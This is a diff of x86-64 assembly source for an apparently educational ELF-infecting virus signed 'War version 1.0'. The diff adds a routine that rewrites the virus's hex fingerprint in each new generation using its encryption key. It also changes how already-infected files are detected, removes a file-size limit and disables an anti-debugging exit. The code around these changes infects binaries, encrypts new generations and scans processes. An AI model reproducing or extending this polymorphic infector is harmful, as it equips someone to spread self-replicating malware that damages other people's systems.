@@ -434,6 +434,34 @@ encrypt_new_gen:	; rdi:bin_addr
 	leave
 	ret
 
+change_fingerprint:	;rdi:addr   rsi:key
+	enter 0, 0
+	mov rcx, 8
+	shr rsi, 32
+	inc rdi
+	while_rcx:
+		cmp rcx, 0
+		je while_rcx_end
+		dec rcx
+		dec rdi
+
+		mov rdx, rsi
+		shl rdx, 60
+		shr rdx, 60
+		shr rsi, 4
+		cmp rdx, 10
+		jge alphabet_num
+		add rdx, 0x30
+		mov BYTE[rdi], dl
+		jmp while_rcx
+		alphabet_num:
+		add rdx, 0x37
+		mov BYTE[rdi], dl
+		jmp while_rcx
+	while_rcx_end:
+	leave
+	ret
+
 rewrite_binary:
 	enter 0, 0
 	mov r11, rdi	;r11 contient elf_struc
@@ -516,6 +544,17 @@ rewrite_binary:
 	push r11
 	call encrypt_new_gen
 	pop r11
+
+	; change the fingerprint
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+	sub rdi, PAYLOAD_SIZE
+	mov rsi, rdi
+	add rsi, encryption_start - _start
+	mov rsi, QWORD[rsi]
+	add rdi, fingerprint - _start
+	add rdi, 7
+	call change_fingerprint
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
 	add rdi, r13
@@ -608,11 +647,6 @@ infect_elf:		; r8:elf_struc
 	cmp rax, 0
 	je infect_elf_end
 
-	mov rdi, QWORD[r8 + elf_struc.bits_added]
-	add rdi, QWORD[r8 + elf_struc.stat + stat.st_size]
-	cmp rdi, 5000000
-	;jg infect_elf_end
-
 	mov rdi, QWORD[r8 + elf_struc.data_phdr]
 	mov rsi, QWORD[rdi + phdr.p_offset]
 	add rsi, QWORD[rdi + phdr.p_filesz]
@@ -629,11 +663,10 @@ infect_elf:		; r8:elf_struc
 	je infect_elf_end
 	pop rdi
 
-	lea rsi, [rel signature]
-	call strcmp							;test if infected
-	cmp rax, 0
+	mov rsi, QWORD[rel signature]
+	mov rdi, QWORD[rdi]
+	cmp rdi, rsi							;test if infected
 	je infect_elf_end
-
 
 	mov rdi, r8
 	call modify_sections
@@ -918,7 +951,7 @@ check_debug:
 main:
 	call check_debug
 	cmp rax, 1
-	je jmp_old_entry
+	;je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
 	call process_dir
@@ -978,9 +1011,8 @@ ddot:
 	db '..', 0
 data_name:
 	db '.data', 0
-bss_name:
-	db '.bss', 0
 encryption_end:
+	db 0
 signature:
 	db 'War version 1.0 (c)oded by gdelabro - '
 fingerprint:
